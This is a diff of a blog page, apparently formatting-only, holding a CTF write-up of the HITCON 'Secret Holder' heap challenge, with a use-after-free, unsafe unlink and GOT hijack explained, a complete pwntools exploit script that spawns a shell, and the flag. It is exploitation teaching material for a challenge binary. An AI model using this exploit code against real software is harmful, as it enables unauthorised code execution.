@@ -310,7 +310,7 @@
 Program allow us to:</p>
 
 <ul>
-  <li>keep secret : new a secret ( using <code class="highlighter-rouge">calloc()</code> )</li>
+  <li>keep secret : new a secret ( using <code class="language-plaintext highlighter-rouge">calloc()</code> )</li>
   <li>wipe secret : delete a secret</li>
   <li>renew secret : edit a secret</li>
 </ul>
@@ -318,12 +318,12 @@ Program allow us to:</p>
 <p>There are three kinds of secret in the program:</p>
 
 <ul>
-  <li><code class="highlighter-rouge">small</code> : secret with buffer size 40</li>
-  <li><code class="highlighter-rouge">big</code> : secret with buffer size 4,000</li>
-  <li><code class="highlighter-rouge">huge</code> : secret with buffer size 400,000</li>
+  <li><code class="language-plaintext highlighter-rouge">small</code> : secret with buffer size 40</li>
+  <li><code class="language-plaintext highlighter-rouge">big</code> : secret with buffer size 4,000</li>
+  <li><code class="language-plaintext highlighter-rouge">huge</code> : secret with buffer size 400,000</li>
 </ul>
 
-<p>There’s a Use-After-Free vulnerability in the <code class="highlighter-rouge">wipe</code> function:</p>
+<p>There’s a Use-After-Free vulnerability in the <code class="language-plaintext highlighter-rouge">wipe</code> function:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">v0</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
 <span class="k">switch</span> <span class="p">(</span> <span class="n">v0</span> <span class="p">)</span>
 <span class="p">{</span>
@@ -341,33 +341,33 @@ Program allow us to:</p>
         <span class="k">break</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
-<p>When wiping a secret, it does not check the <code class="highlighter-rouge">has_keep_XXX</code> flag ( a flag that indicates now there’s a small/big/huge secret in the program). So for example if we <code class="highlighter-rouge">keep(small)</code> –&gt; <code class="highlighter-rouge">wipe(small)</code> –&gt; <code class="highlighter-rouge">keep(big)</code> –&gt; <strong><code class="highlighter-rouge">wipe(small)</code></strong>, it will free the <code class="highlighter-rouge">big</code> buffer, but we can still <code class="highlighter-rouge">renew(big)</code></p>
+<p>When wiping a secret, it does not check the <code class="language-plaintext highlighter-rouge">has_keep_XXX</code> flag ( a flag that indicates now there’s a small/big/huge secret in the program). So for example if we <code class="language-plaintext highlighter-rouge">keep(small)</code> –&gt; <code class="language-plaintext highlighter-rouge">wipe(small)</code> –&gt; <code class="language-plaintext highlighter-rouge">keep(big)</code> –&gt; <strong><code class="language-plaintext highlighter-rouge">wipe(small)</code></strong>, it will free the <code class="language-plaintext highlighter-rouge">big</code> buffer, but we can still <code class="language-plaintext highlighter-rouge">renew(big)</code></p>
 
-<p>During the contest I did not know how to exploit the service. I successfully overlapped the <code class="highlighter-rouge">small</code> and the <code class="highlighter-rouge">big</code> buffer, but it only made me able to overwrite the top_size, which is useless since we can’t control the size of the <code class="highlighter-rouge">calloc</code> function ( thus we can’t do the <a href="https://github.com/shellphish/how2heap/blob/master/house_of_force.c">House of Force</a> attack ). I was also failed to overlapped these two buffer with the different base address ( that is, I can only overlapped <code class="highlighter-rouge">small</code> &amp; <code class="highlighter-rouge">big</code> with the same base heap address), so I was unable to overflow the heap buffer and overwrite the chunk header.</p>
+<p>During the contest I did not know how to exploit the service. I successfully overlapped the <code class="language-plaintext highlighter-rouge">small</code> and the <code class="language-plaintext highlighter-rouge">big</code> buffer, but it only made me able to overwrite the top_size, which is useless since we can’t control the size of the <code class="language-plaintext highlighter-rouge">calloc</code> function ( thus we can’t do the <a href="https://github.com/shellphish/how2heap/blob/master/house_of_force.c">House of Force</a> attack ). I was also failed to overlapped these two buffer with the different base address ( that is, I can only overlapped <code class="language-plaintext highlighter-rouge">small</code> &amp; <code class="language-plaintext highlighter-rouge">big</code> with the same base heap address), so I was unable to overflow the heap buffer and overwrite the chunk header.</p>
 
-<p>After I asked the author of this challege, I realize that the key point of solving this challenge is to <strong>exploit the <code class="highlighter-rouge">huge</code> and the <code class="highlighter-rouge">big</code>’s memory chunk</strong>.</p>
+<p>After I asked the author of this challege, I realize that the key point of solving this challenge is to <strong>exploit the <code class="language-plaintext highlighter-rouge">huge</code> and the <code class="language-plaintext highlighter-rouge">big</code>’s memory chunk</strong>.</p>
 
-<p>While solving this challenge, I thought that if the malloc size was larger than <code class="highlighter-rouge">0x20000</code>, glibc will always use <code class="highlighter-rouge">mmap</code> to allocate the memory space. But I was wrong – if we <code class="highlighter-rouge">keep(huge)</code>–&gt; <code class="highlighter-rouge">wipe(huge)</code>–&gt; <code class="highlighter-rouge">keep(huge)</code>, we will found that the second <code class="highlighter-rouge">huge</code> buffer was allocated by the <code class="highlighter-rouge">malloc</code> function, not <code class="highlighter-rouge">mmap</code> !! ( Thanks to the god damn <code class="highlighter-rouge">sysmalloc</code> !! )</p>
+<p>While solving this challenge, I thought that if the malloc size was larger than <code class="language-plaintext highlighter-rouge">0x20000</code>, glibc will always use <code class="language-plaintext highlighter-rouge">mmap</code> to allocate the memory space. But I was wrong – if we <code class="language-plaintext highlighter-rouge">keep(huge)</code>–&gt; <code class="language-plaintext highlighter-rouge">wipe(huge)</code>–&gt; <code class="language-plaintext highlighter-rouge">keep(huge)</code>, we will found that the second <code class="language-plaintext highlighter-rouge">huge</code> buffer was allocated by the <code class="language-plaintext highlighter-rouge">malloc</code> function, not <code class="language-plaintext highlighter-rouge">mmap</code> !! ( Thanks to the god damn <code class="language-plaintext highlighter-rouge">sysmalloc</code> !! )</p>
 
 <p>So here’s how we gonna exploit it:</p>
 
 <ul>
-  <li>Use <code class="highlighter-rouge">keep</code> and <code class="highlighter-rouge">wipe</code> to make <code class="highlighter-rouge">small</code> &amp; <code class="highlighter-rouge">huge</code> buffer be on the same heap address.</li>
-  <li><code class="highlighter-rouge">keep(big)</code> and make <code class="highlighter-rouge">big</code> buffer adjacent to the end of the <code class="highlighter-rouge">small</code> buffer.</li>
-  <li>By doing <code class="highlighter-rouge">renew(huge)</code>, we’ll be able to overflow the whole <code class="highlighter-rouge">big</code> buffer, thus we can create a fake <strong>smallbin</strong> memory chunk at the address of the <code class="highlighter-rouge">big</code> buffer.</li>
-  <li>By creating some fake chunks, we can use the <a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c">unsafe unlink</a> attack to overwrite <code class="highlighter-rouge">&amp;huge_buf</code> ( all three buffer’s address are store in the global data section ), so now the <code class="highlighter-rouge">huge</code>’s buffer will be lying on the global data section.</li>
-  <li>Now we can overwrite all three buffer address ( data pointer ) by doing <code class="highlighter-rouge">renew(huge)</code></li>
-  <li><code class="highlighter-rouge">renew(small/huge/big)</code> to overwrite the content of any address.</li>
+  <li>Use <code class="language-plaintext highlighter-rouge">keep</code> and <code class="language-plaintext highlighter-rouge">wipe</code> to make <code class="language-plaintext highlighter-rouge">small</code> &amp; <code class="language-plaintext highlighter-rouge">huge</code> buffer be on the same heap address.</li>
+  <li><code class="language-plaintext highlighter-rouge">keep(big)</code> and make <code class="language-plaintext highlighter-rouge">big</code> buffer adjacent to the end of the <code class="language-plaintext highlighter-rouge">small</code> buffer.</li>
+  <li>By doing <code class="language-plaintext highlighter-rouge">renew(huge)</code>, we’ll be able to overflow the whole <code class="language-plaintext highlighter-rouge">big</code> buffer, thus we can create a fake <strong>smallbin</strong> memory chunk at the address of the <code class="language-plaintext highlighter-rouge">big</code> buffer.</li>
+  <li>By creating some fake chunks, we can use the <a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c">unsafe unlink</a> attack to overwrite <code class="language-plaintext highlighter-rouge">&amp;huge_buf</code> ( all three buffer’s address are store in the global data section ), so now the <code class="language-plaintext highlighter-rouge">huge</code>’s buffer will be lying on the global data section.</li>
+  <li>Now we can overwrite all three buffer address ( data pointer ) by doing <code class="language-plaintext highlighter-rouge">renew(huge)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">renew(small/huge/big)</code> to overwrite the content of any address.</li>
 </ul>
 
-<p>After we overwrite the <code class="highlighter-rouge">huge</code>’s buffer address, we can try to do the GOT hijacking attack. But first we’ll have to leak some address. The program itself did not output any of our input , so I decide to hijack  <code class="highlighter-rouge">free</code>’s GOT first.</p>
+<p>After we overwrite the <code class="language-plaintext highlighter-rouge">huge</code>’s buffer address, we can try to do the GOT hijacking attack. But first we’ll have to leak some address. The program itself did not output any of our input , so I decide to hijack  <code class="language-plaintext highlighter-rouge">free</code>’s GOT first.</p>
 
-<p>By overwriting <code class="highlighter-rouge">free</code>’s GOT into <code class="highlighter-rouge">puts@plt</code>, and <code class="highlighter-rouge">small</code>’s buffer into <code class="highlighter-rouge">__libc_start_main@got.plt</code>, we are able to leak the libc’s address by doing <code class="highlighter-rouge">wipe(small)</code>, since it’ll call <code class="highlighter-rouge">free(small)</code>, which is now <code class="highlighter-rouge">puts(_libc_start_main@got.plt)</code>.</p>
+<p>By overwriting <code class="language-plaintext highlighter-rouge">free</code>’s GOT into <code class="language-plaintext highlighter-rouge">puts@plt</code>, and <code class="language-plaintext highlighter-rouge">small</code>’s buffer into <code class="language-plaintext highlighter-rouge">__libc_start_main@got.plt</code>, we are able to leak the libc’s address by doing <code class="language-plaintext highlighter-rouge">wipe(small)</code>, since it’ll call <code class="language-plaintext highlighter-rouge">free(small)</code>, which is now <code class="language-plaintext highlighter-rouge">puts(_libc_start_main@got.plt)</code>.</p>
 
-<p>After that we’re able to overwrite some GOT and hijack the control flow. Here I overwrite <code class="highlighter-rouge">puts</code>’s GOT into the address of the <a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf">one-gadget</a>, which will make the program spawn a shell whenever it tries to call <code class="highlighter-rouge">puts</code> to print out some message.</p>
+<p>After that we’re able to overwrite some GOT and hijack the control flow. Here I overwrite <code class="language-plaintext highlighter-rouge">puts</code>’s GOT into the address of the <a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf">one-gadget</a>, which will make the program spawn a shell whenever it tries to call <code class="language-plaintext highlighter-rouge">puts</code> to print out some message.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -378,13 +378,13 @@ Program allow us to:</p>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./secret_holder_noalarm"</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"/lib/x86_64-linux-gnu/libc.so.6"</span>
 
-<span class="c"># setting </span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># setting 
+</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
 <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+<span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
@@ -418,48 +418,48 @@ Program allow us to:</p>
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    <span class="n">keep</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="c1">#r = process(ELF_PATH)
+</span>    <span class="n">keep</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
     <span class="n">keep</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
     <span class="n">keep</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
     <span class="n">wipe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">wipe</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
     <span class="n">wipe</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
 
-    <span class="n">keep</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"3"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># now huge chunk will use malloc, not mmap!!</span>
-    <span class="n">wipe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-    <span class="n">keep</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># now huge = small</span>
-    <span class="n">keep</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"2"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># big will adjacent to the end of the small buffer</span>
-
-    <span class="c"># 0x6020a8 stores the huge buffer's address</span>
-    <span class="n">fake_fd</span> <span class="o">=</span> <span class="mh">0x6020a8</span> <span class="o">-</span> <span class="mh">0x18</span>
+    <span class="n">keep</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"3"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># now huge chunk will use malloc, not mmap!!
+</span>    <span class="n">wipe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">keep</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># now huge = small
+</span>    <span class="n">keep</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"2"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># big will adjacent to the end of the small buffer
+</span>
+    <span class="c1"># 0x6020a8 stores the huge buffer's address
+</span>    <span class="n">fake_fd</span> <span class="o">=</span> <span class="mh">0x6020a8</span> <span class="o">-</span> <span class="mh">0x18</span>
     <span class="n">fake_bk</span> <span class="o">=</span> <span class="mh">0x6020a8</span> <span class="o">-</span> <span class="mh">0x10</span>
 
-    <span class="c"># overwrite big's chunk data with fake chunk data for unsafe unlink</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c"># fake prev_chunk header</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_bk</span><span class="p">)</span> <span class="c"># fake fd and bk</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="c"># we are going to free here</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x80</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="c"># fake next_chunk header</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x80</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="c"># fake next_next_chunk header</span>
-    <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="c1"># overwrite big's chunk data with fake chunk data for unsafe unlink
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># fake prev_chunk header
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_bk</span><span class="p">)</span> <span class="c1"># fake fd and bk
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="c1"># we are going to free here
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mh">0x80</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="c1"># fake next_chunk header
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="mh">0x80</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="c1"># fake next_next_chunk header
+</span>    <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
     
-    <span class="n">wipe</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c"># free big, trigger unsafe unlink</span>
-
-    <span class="c"># now huge_buf will point to global data section</span>
-    <span class="c"># renew huge, overwrite small, big &amp; huge buffer address</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span>
+    <span class="n">wipe</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># free big, trigger unsafe unlink
+</span>
+    <span class="c1"># now huge_buf will point to global data section
+</span>    <span class="c1"># renew huge, overwrite small, big &amp; huge buffer address
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020b0</span><span class="p">)</span> <span class="c"># &amp;small_buf</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">])</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020b0</span><span class="p">)</span> <span class="c1"># &amp;small_buf
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">])</span>
     <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
     
-    <span class="n">renew</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]))</span> <span class="c"># make free(buf) = puts(buf)</span>
-    
-    <span class="c"># make small_buf = libc_start_main got</span>
-    <span class="c"># wipe(small) = puts(small) = puts(got) = leak address</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+    <span class="n">renew</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]))</span> <span class="c1"># make free(buf) = puts(buf)
+</span>    
+    <span class="c1"># make small_buf = libc_start_main got
+</span>    <span class="c1"># wipe(small) = puts(small) = puts(got) = leak address
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
     <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
     <span class="n">wipe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
@@ -467,8 +467,8 @@ Program allow us to:</p>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
     <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"one_gadget: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
 
-    <span class="c"># hijack puts@got.plt, make it jump to one_gadget</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+    <span class="c1"># hijack puts@got.plt, make it jump to one_gadget
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
     <span class="n">renew</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
     <span class="n">renew</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
 
@@ -479,7 +479,7 @@ Program allow us to:</p>
 
 <p>Such a shame that I didn’t solve this challenge …… I might be able to solve it if I did some more fuzzing…..</p>
 
-<p>flag: <code class="highlighter-rouge">hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}</code></p>
 
         
       </section>
@@ -592,7 +592,6 @@ Program allow us to:</p>
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -612,7 +611,6 @@ Program allow us to:</p>
 
         
           
-          
 
 
 
@@ -631,7 +629,6 @@ Program allow us to:</p>
 </div>
 
         
-          
           
 
 
@@ -654,7 +651,6 @@ Program allow us to:</p>
 
         
           
-          
 
 
 
@@ -675,6 +671,7 @@ Program allow us to:</p>
         
       </div>
     </div>
+  
   
 </div>
 
@@ -725,7 +722,7 @@ Program allow us to:</p>
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
